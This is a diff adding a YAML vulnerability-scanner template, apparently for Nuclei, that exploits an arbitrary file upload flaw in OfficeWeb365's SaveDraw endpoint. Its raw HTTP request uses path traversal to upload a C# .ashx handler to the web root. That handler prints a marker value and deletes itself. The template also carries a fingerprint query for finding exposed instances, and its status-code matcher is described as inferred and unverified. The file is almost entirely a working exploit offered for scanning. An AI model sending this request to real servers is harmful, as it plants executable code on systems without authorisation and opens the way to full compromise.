@@ -1,0 +1,21 @@
+id: poc-6d1ce76039fa15d24ba1
+info:
+  name: OfficeWeb365SaveDraw存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6d1ce76039fa15d24ba14e4f7556e3cd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6d1ce76039fa15d24ba14e4f7556e3cd
+    fofa: + hunter：`app.name="OfficeWeb365"`
+http:
+- raw:
+  - "POST /PW/SaveDraw?path=../../Content/img&idx=11.ashx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/png;base64,<%@ Language=\"C#\" Class=\"Handler1\" %>public class Handler1:System.Web.IHttpHandler\n{\npublic void ProcessRequest(System.Web.HttpContext context)\n{\nSystem.Web.HttpResponse response = context.Response;\nresponse.Write(44 * 41);\n\nstring filePath = context.Server.MapPath(\"/\") + context.Request.Path;\nif (System.IO.File.Exists(filePath))\n{\n    System.IO.File.Delete(filePath);\n}\n}\npublic bool IsReusable\n{\nget { return false; }\n}\n}///---"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
